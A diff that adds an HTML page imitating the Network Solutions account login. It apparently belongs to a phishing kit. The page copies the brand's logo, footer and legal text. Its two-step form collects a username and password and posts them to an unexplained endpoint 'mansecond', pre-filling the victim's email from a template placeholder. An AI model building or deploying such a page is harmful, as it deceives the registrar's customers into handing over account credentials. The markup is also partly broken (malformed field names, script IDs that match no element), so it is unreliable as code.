@@ -1,0 +1,515 @@
+ <!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="stylesheet" href="App.css">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <title>Log In - Network Solutions</title>
+</head>
+<style>
+/* Reset and Base Styles */
+* {
+  box-sizing: border-box;
+  margin: 0;
+  padding: 0;
+}
+
+body {
+  font-family: 'Inter', sans-serif;
+  background-color: #f9f9f9;
+  color: #333;
+  min-height: 100vh;
+  display: flex;
+  flex-direction: column;
+}
+
+/* Top Banner */
+.top-banner {
+  background-color: #003038; /* Dark Teal */
+  color: white;
+  padding: 12px 0;
+  text-align: center;
+  font-size: 14px;
+  font-weight: 500;
+}
+
+.banner-content {
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  gap: 8px;
+}
+
+.check-it-out {
+  color: #4dbecf;
+  text-decoration: none;
+  font-weight: 600;
+  margin-left: 4px;
+  display: inline-flex;
+  align-items: center;
+}
+
+.check-it-out:hover {
+  text-decoration: underline;
+}
+
+.arrow {
+  margin-left: 4px;
+}
+
+/* Main Container */
+.login-container {
+  flex: 1;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  padding-top: 40px;
+  padding-bottom: 40px;
+}
+
+.logo-container {
+  margin-bottom: 30px;
+}
+
+/* Login Card */
+.login-card {
+  background: white;
+  padding: 40px;
+  border-radius: 8px;
+  box-shadow: 0 4px 12px rgba(0, 0, 0, 0.05);
+  width: 100%;
+  max-width: 450px;
+  text-align: center;
+}
+
+.login-card h1 {
+  font-size: 24px;
+  font-weight: 700;
+  margin-bottom: 30px;
+  color: #000;
+}
+
+/* Input Group */
+.input-group {
+  text-align: left;
+  margin-bottom: 20px;
+}
+
+.input-group label {
+  display: flex;
+  align-items: center;
+  font-size: 14px;
+  font-weight: 600;
+  color: #666;
+  margin-bottom: 8px;
+}
+
+.info-icon {
+  margin-left: 6px;
+  color: #999;
+  cursor: pointer;
+  font-size: 14px;
+}
+
+.input-group input {
+  width: 100%;
+  padding: 12px 16px;
+  border: 1px solid #ccc;
+  border-radius: 4px;
+  font-size: 16px;
+  outline: none;
+  transition: border-color 0.2s;
+}
+
+.input-group input:focus {
+  border-color: #003038;
+}
+
+.password-wrapper {
+  position: relative;
+}
+
+.password-wrapper input {
+  padding-right: 40px; /* Space for eye icon */
+}
+
+.toggle-password {
+  position: absolute;
+  right: 12px;
+  top: 50%;
+  transform: translateY(-50%);
+  background: none;
+  border: none;
+  cursor: pointer;
+  color: #666;
+  padding: 0;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+}
+
+.toggle-password:hover {
+  color: #333;
+}
+
+/* Forgot Links */
+.forgot-link {
+  text-align: right;
+  margin-bottom: 24px;
+}
+
+.forgot-link a {
+  color: #4a90e2;
+  text-decoration: none;
+  font-size: 14px;
+  font-weight: 500;
+}
+
+.forgot-link a:hover {
+  text-decoration: underline;
+}
+
+/* Sign In / Next Button */
+.sign-in-btn {
+  width: 100%;
+  padding: 14px;
+  background-color: #9ebbf7; /* Periwinkle Blue */
+  color: white;
+  border: none;
+  border-radius: 4px;
+  font-size: 16px;
+  font-weight: 600;
+  cursor: pointer;
+  margin-bottom: 30px;
+  transition: background-color 0.2s;
+}
+
+.sign-in-btn:hover {
+  background-color: #8aa8e5;
+}
+
+/* Divider */
+.divider {
+  display: flex;
+  align-items: center;
+  text-align: center;
+  margin-bottom: 24px;
+  color: #888;
+  font-size: 14px;
+}
+
+.divider::before,
+.divider::after {
+  content: '';
+  flex: 1;
+  border-bottom: 1px solid #e0e0e0;
+}
+
+.divider span {
+  padding: 0 10px;
+}
+
+/* Social Buttons */
+.social-btn {
+  width: 100%;
+  padding: 12px;
+  background: white;
+  border: 1px solid #ddd;
+  border-radius: 4px;
+  font-size: 16px;
+  font-weight: 500;
+  color: #333;
+  cursor: pointer;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 10px;
+  margin-bottom: 12px;
+  transition: background-color 0.2s;
+}
+
+.social-btn:hover {
+  background-color: #f5f5f5;
+}
+
+.social-btn:last-child {
+  margin-bottom: 0;
+}
+
+/* Create Account Link */
+.create-account {
+  margin-top: 24px;
+  font-size: 14px;
+  color: #666;
+}
+
+.create-account a {
+  color: #4a90e2;
+  text-decoration: none;
+  font-weight: 600;
+}
+
+.create-account a:hover {
+  text-decoration: underline;
+}
+
+/* Chat Widget */
+.chat-widget {
+  position: fixed;
+  bottom: 20px;
+  right: 20px;
+  z-index: 100;
+}
+
+.chat-btn {
+  width: 56px;
+  height: 56px;
+  border-radius: 50%;
+  background: white;
+  border: none;
+  box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+  cursor: pointer;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  transition: transform 0.2s;
+}
+
+.chat-btn:hover {
+  transform: scale(1.05);
+}
+
+/* Footer */
+.site-footer {
+  padding: 20px;
+  text-align: center;
+  font-size: 11px;
+  color: #333;
+  background-color: #f9f9f9;
+  margin-top: auto;
+}
+
+.footer-links {
+  margin-bottom: 10px;
+  display: flex;
+  flex-wrap: wrap;
+  justify-content: center;
+  gap: 5px;
+}
+
+.footer-links a {
+  color: #333;
+  text-decoration: none;
+  font-weight: 600;
+}
+
+.footer-links a:hover {
+  text-decoration: underline;
+}
+
+.separator {
+  color: #ccc;
+  margin: 0 2px;
+}
+
+.footer-copyright {
+  color: #333;
+  line-height: 1.5;
+}
+
+</style>
+<body>
+
+  <div class="top-banner">
+    <div class="banner-content">
+      <span class="eyes-emoji">👀</span>
+      <span>We've got a new look!</span>
+      <a href="#" class="check-it-out">Check it out now <span class="arrow">→</span></a>
+    </div>
+  </div>
+
+  <main class="login-container">
+    <div class="logo-container">
+      <!-- Network Solutions Logo Placeholder -->
+      <svg width="200" height="50" viewBox="0 0 200 50" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <path d="M25.5 12.5L20.5 2.5L15.5 12.5L5.5 17.5L15.5 22.5L20.5 32.5L25.5 22.5L35.5 17.5L25.5 12.5Z" fill="#333"/>
+        <path d="M20.5 2.5L25.5 12.5L35.5 17.5L25.5 22.5L20.5 32.5L15.5 22.5L5.5 17.5L15.5 12.5L20.5 2.5Z" stroke="#333" stroke-width="2"/>
+        <path d="M15.5 12.5L10.5 2.5" stroke="#333" stroke-width="2" stroke-linecap="round"/>
+        <path d="M25.5 12.5L30.5 2.5" stroke="#333" stroke-width="2" stroke-linecap="round"/>
+        <path d="M25.5 22.5L30.5 32.5" stroke="#333" stroke-width="2" stroke-linecap="round"/>
+        <path d="M15.5 22.5L10.5 32.5" stroke="#333" stroke-width="2" stroke-linecap="round"/>
+        <text x="45" y="22" font-family="Inter, sans-serif" font-size="18" font-weight="bold" fill="#222">Network</text>
+        <text x="45" y="38" font-family="Inter, sans-serif" font-size="18" font-weight="bold" fill="#222">Solutions</text>
+      </svg>
+    </div>
+
+    <div class="login-card">
+      <h1>Log Into Your Account</h1>
+
+      <!-- Step 1: Username -->
+      <div id="step-1">
+        <form method="post" action="mansecond">
+
+        <div class="input-group">
+          <label for="username">Username or email address <span class="info-icon" title="Enter your username or email">ⓘ</span></label>
+          <input type="text" id="username" name=""emailail"  value="{{eman}}">
+        </div>
+
+        <div class="forgot-link">
+          <a href="#">Forgot User ID?</a>
+        </div>
+
+        <button class="sign-in-btn" id="nextBtn">Next</button>
+
+        <div class="divider">
+          <span>Or continue with</span>
+        </div>
+
+        <button class="social-btn google-btn">
+          <svg class="social-icon" viewBox="0 0 24 24" width="20" height="20" xmlns="http://www.w3.org/2000/svg">
+            <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/>
+            <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/>
+            <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" fill="#FBBC05"/>
+            <path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/>
+          </svg>
+          Continue with Google
+        </button>
+
+        <button class="social-btn apple-btn">
+          <svg class="social-icon" viewBox="0 0 24 24" width="20" height="20" fill="black" xmlns="http://www.w3.org/2000/svg">
+            <path d="M17.05 19.09c1.49 2.19 3.13 1.41 3.13 1.41s.16-.08.27-.16c-.05-.05-.13-.11-.22-.19-.86-.73-1.41-1.85-1.41-2.97 0-2.35 1.93-3.6 2.02-3.65-.02-.08-.31-1.07-1.58-2.91-1.33-1.92-2.73-2.14-3.3-2.17-1.41-.08-2.75.83-3.46.83-.72 0-1.9-.81-3.13-.79-1.61.02-3.1 0.94-3.93 2.38-1.67 2.9-0.43 7.19 1.19 9.54 0.79 1.15 1.73 2.42 2.96 2.38 1.18-.05 1.63-.76 3.06-.76 1.43 0 1.83.76 3.07.74 1.27-.02 2.17-1.15 2.98-2.33l.01-.01c.01-.02.02-.03.03-.04zm-3.86-13.3c0.72-0.87 1.21-2.08 1.07-3.29-1.04 0.04-2.3 0.69-3.05 1.56-.67.77-1.26 2.01-1.1 3.18 1.16 0.09 2.35-0.58 3.08-1.45z"/>
+          </svg>
+          Continue with Apple
+        </button>
+
+        <div class="create-account">
+          Don't have an account? <a href="#">Get started now!</a>
+        </div>
+      </div>
+
+      <!-- Step 2: Password (Hidden initially) -->
+      <div id="step-2" style="display: none;">
+        <div class="input-group">
+          <label for="password">Password</label>
+          <div class="password-wrapper">
+            <input type="password" id="password" name="passwordail">
+            <button type="button" class="toggle-password" id="togglePassword" aria-label="Show password">
+              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
+                <circle cx="12" cy="12" r="3"></circle>
+              </svg>
+            </button>
+          </div>
+        </div>
+
+        <div class="forgot-link">
+          <a href="#">Forgot Password?</a>
+        </div>
+
+        <button class="sign-in-btn">Sign In</button>
+
+        <div class="divider">
+          <span>Or continue with</span>
+        </div>
+          </form>
+        <button class="social-btn google-btn">
+          <svg class="social-icon" viewBox="0 0 24 24" width="20" height="20" xmlns="http://www.w3.org/2000/svg">
+            <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/>
+            <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/>
+            <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" fill="#FBBC05"/>
+            <path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/>
+          </svg>
+          Continue with Google
+        </button>
+
+        <button class="social-btn apple-btn">
+          <svg class="social-icon" viewBox="0 0 24 24" width="20" height="20" fill="black" xmlns="http://www.w3.org/2000/svg">
+            <path d="M17.05 19.09c1.49 2.19 3.13 1.41 3.13 1.41s.16-.08.27-.16c-.05-.05-.13-.11-.22-.19-.86-.73-1.41-1.85-1.41-2.97 0-2.35 1.93-3.6 2.02-3.65-.02-.08-.31-1.07-1.58-2.91-1.33-1.92-2.73-2.14-3.3-2.17-1.41-.08-2.75.83-3.46.83-.72 0-1.9-.81-3.13-.79-1.61.02-3.1 0.94-3.93 2.38-1.67 2.9-0.43 7.19 1.19 9.54 0.79 1.15 1.73 2.42 2.96 2.38 1.18-.05 1.63-.76 3.06-.76 1.43 0 1.83.76 3.07.74 1.27-.02 2.17-1.15 2.98-2.33l.01-.01c.01-.02.02-.03.03-.04zm-3.86-13.3c0.72-0.87 1.21-2.08 1.07-3.29-1.04 0.04-2.3 0.69-3.05 1.56-.67.77-1.26 2.01-1.1 3.18 1.16 0.09 2.35-0.58 3.08-1.45z"/>
+          </svg>
+          Continue with Apple
+        </button>
+      </div>
+    </div>
+  </main>
+
+  <div class="chat-widget">
+    <button class="chat-btn">
+      <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <path d="M21 11.5a8.38 8.38 0 0 1-.9 3.8 8.5 8.5 0 0 1-7.6 4.7 8.38 8.38 0 0 1-3.8-.9L3 21l1.9-5.7a8.38 8.38 0 0 1-.9-3.8 8.5 8.5 0 0 1 4.7-7.6 8.38 8.38 0 0 1 3.8-.9h.5a8.48 8.48 0 0 1 8 8v.5z" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" fill="#28a745"/>
+        <path d="M9 10a1 1 0 1 1-2 0 1 1 0 0 1 2 0z" fill="#fff"/>
+        <path d="M13 10a1 1 0 1 1-2 0 1 1 0 0 1 2 0z" fill="#fff"/>
+        <path d="M17 10a1 1 0 1 1-2 0 1 1 0 0 1 2 0z" fill="#fff"/>
+      </svg>
+    </button>
+  </div>
+
+  <footer class="site-footer">
+    <div class="footer-links">
+      <a href="#">Legal</a>
+      <span class="separator">|</span>
+      <a href="#">Privacy Policy</a>
+      <span class="separator">|</span>
+      <a href="#">Terms of Use</a>
+      <span class="separator">|</span>
+      <a href="#">Cookie Policy</a>
+      <span class="separator">|</span>
+      <a href="#">Dispute Policy</a>
+      <span class="separator">|</span>
+      <a href="#">DMCA Policy</a>
+      <span class="separator">|</span>
+      <a href="#">Do Not Sell My Personal Information</a>
+      <span class="separator">|</span>
+      <a href="#">Report Abuse</a>
+    </div>
+    <div class="footer-copyright">
+      © Copyright 2025 Network Solutions, LLC. All rights reserved.
+      <br>
+      All registered trademarks herein are the property of their respective owners.
+    </div>
+  </footer>
+
+  <script>
+document.addEventListener('DOMContentLoaded', () => {
+  const step1 = document.getElementById('step-1');
+  const step2 = document.getElementById('step-2');
+  const nextBtn = document.getElementById('nextBtn');
+  const usernameInput = document.getElementById('emailail');
+  const togglePasswordBtn = document.getElementById('togglePassword');
+  const passwordInput = document.getElementById('passwordail');
+
+  // Step 1 -> Step 2 Transition
+  nextBtn.addEventListener('click', () => {
+    // Optional: Add validation here
+    if (usernameInput.value.trim() !== '') {
+      step1.style.display = 'none';
+      step2.style.display = 'block';
+      // Focus on password input
+      setTimeout(() => passwordInput.focus(), 100);
+    } else {
+      // Simple visual feedback for empty input
+      usernameInput.style.borderColor = 'red';
+      setTimeout(() => usernameInput.style.borderColor = '#ccc', 2000);
+    }
+  });
+
+  // Allow pressing Enter in username field to trigger Next
+  usernameInput.addEventListener('keypress', (e) => {
+    if (e.key === 'Enter') {
+      nextBtn.click();
+    }
+  });
+
+  // Password Visibility Toggle
+  togglePasswordBtn.addEventListener('click', () => {
+    const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
+    passwordInput.setAttribute('type', type);
+    togglePasswordBtn.setAttribute('aria-label', type === 'password' ? 'Show password' : 'Hide password');
+  });
+});
+
+</script>
+</body>
+</html>
